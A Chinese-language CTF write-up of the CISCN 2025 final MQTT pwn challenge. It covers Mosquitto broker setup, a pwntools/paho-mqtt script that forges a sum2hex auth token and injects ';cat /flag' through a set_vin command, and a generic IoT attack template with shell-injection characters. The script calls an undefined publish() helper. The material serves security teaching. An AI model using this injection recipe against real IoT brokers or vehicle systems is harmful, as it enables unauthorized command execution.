---
title: mqtt 协议 pwn 入门 (ciscn2025_final_mqtt)
contest: CISCN
year: 2025
difficulty: hard
vuln_type: pwn_unknown
tags: [mqtt, mosquitto, iot, command-injection, vin-set, sum2hex, paho-mqtt, amd64]
attack_chain:
  - 安装 mosquitto MQTT broker
  - mosquitto_sub/pub 测试通信
  - 监听端口 9999 + allow_anonymous
  - 启动 pwn binary
  - paho.mqtt.client 连接
  - 订阅 vehicle_diag/diag/#/diag/resp
  - publish 构造 json: auth/cmd/arg
  - set_vin 触发命令执行
  - cat /flag 通过 RCE
key_payload: MQTT set_vin 命令注入 + sum2hex 鉴权
one_liner: ciscn 2025 final MQTT Pwn 题：物联网车机诊断协议 + 命令注入。
lesson: 物联网协议 (MQTT/CoAP/Modbus) 是现代 CTF 新增长点。
quality: high
---

ciscn 2025 final MQTT PWN 复盘（来源 ctfiot，作者 sparkle666）。

**MQTT 协议背景**
- **角色**：Publisher / Subscriber / Broker
- **主题 (Topic)**：层级结构 `vehicle/diag/...`
- **消息 (Payload)**：任意格式

**环境搭建**
```bash
sudo apt install mosquitto mosquitto-clients
sudo systemctl enable mosquitto
sudo systemctl start mosquitto

mosquitto_sub -h localhost -t test/topic
mosquitto_pub -h localhost -t test/topic -m "Hello MQTT"

# 配置 /etc/mosquitto/mosquitto.conf
listener 9999
allow_anonymous true
```

**复盘脚本**
```python
#!/usr/bin/python3
import random
from pwn import *
import paho.mqtt.client as mqtt
import json

io = remote('127.0.0.1', 9999)

def sum2hex(dest):
    v3 = 0
    for i in range(len(dest)):
        v3 = (0x1f * v3 + ord(dest[i])) & 0xffffffff
    return f"{v3:08x}"

topic = "diag"
client = mqtt.Client()
client.connect(host="127.0.0.1", port=9999, keepalive=10000)
client.loop_start()

auth = sum2hex("test")
publish(client, "diag", auth, "set_vin", "111111111111")
sleep(0.5)
publish(client, "diag", auth, "set_vin", ";cat /flag")
sleep(1)
io.interactive()
```

**关键洞察**：
- MQTT 客户端可以发布到 broker
- broker 把消息转发到目标
- 目标处理 `set_vin` 命令，参数未做消毒 → `;cat /flag` 触发命令注入
- `sum2hex` 简单校验 auth 但内容可控

**物联网协议 PWN 模板**：
1. 找 broker 配置（端口、是否匿名、ACL）
2. 订阅所有 topic (`#`)
3. publish 触发命令执行类操作（set/update/control）
4. 参数注入（`;`、`|`、`&&`、`$(...)`）

整篇适合作为"物联网协议安全"入门。
